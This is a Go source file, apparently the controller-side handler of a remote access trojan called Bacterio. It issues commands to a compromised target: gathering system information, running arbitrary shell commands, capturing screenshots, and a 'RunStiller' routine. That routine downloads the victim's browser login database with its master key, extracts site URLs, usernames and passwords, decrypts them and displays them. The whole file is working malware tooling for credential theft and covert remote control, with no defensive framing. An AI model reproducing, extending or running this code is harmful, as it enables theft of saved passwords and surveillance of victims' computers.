package handler

import (
	"fmt"
	"os"
	"strings"

	"github.com/fatih/color"
	"github.com/fr13n8/Bacterio/internal/models"
	"github.com/fr13n8/Bacterio/internal/ui"
	"github.com/fr13n8/Bacterio/pkg/system"
	"github.com/fr13n8/Bacterio/pkg/utils"
	"github.com/google/uuid"
	"github.com/jmoiron/sqlx"
	_ "github.com/mattn/go-sqlite3"
)

func (h *Handler) GetTargetInfo() {
	info, err := h.services.Server.GetInformation()
	if err != nil {
		fmt.Println(err.Error())
	}
	color.Green(string(info))
}

func (h *Handler) RunCommand(v []string) {
	cmd := strings.Join(v[:], " ")
	res, err := h.services.Server.RunCommand(cmd)
	if err != nil {
		fmt.Println(err.Error())
	}
	fmt.Println(string(res))
}

func (h *Handler) RunStiller() {
	data, err := h.services.Server.RunStiller()
	if err != nil {
		fmt.Println(err.Error())
	}

	system.CreateDirectory(utils.Files)
	filename := fmt.Sprint(utils.Files, string(os.PathSeparator), uuid.New().String())
	err = utils.SaveFile(data.Data, filename)
	if err != nil {
		fmt.Println(err.Error())
	}
	color.Green("file %s created", filename)

	db, err := sqlx.Open("sqlite3", filename)
	if err != nil {
		panic(err)
	}
	defer db.Close()
	var resp []models.Credentials
	err = db.Select(&resp, "SELECT origin_url, username_value, password_value  FROM logins")
	if err != nil {
		panic(err)
	}

	masterKey := data.MasterKey
	credsArray := utils.GetDecryptData(resp, masterKey)

	ui.RenderTableOfCredentials(credsArray)
}

func (h *Handler) GetScreenshot() {
	system.CreateDirectory(utils.TempDir)
	data, err := h.services.Server.TakeScreenshot()
	if err != nil {
		fmt.Println(err)
	}

	filename := fmt.Sprint(utils.TempDir, string(os.PathSeparator), uuid.New().String(), ".png")
	err = utils.SaveFile(data, filename)
	if err != nil {
		fmt.Println(err.Error())
	}

	color.Green("[!] File saved at %s\n", filename)
}
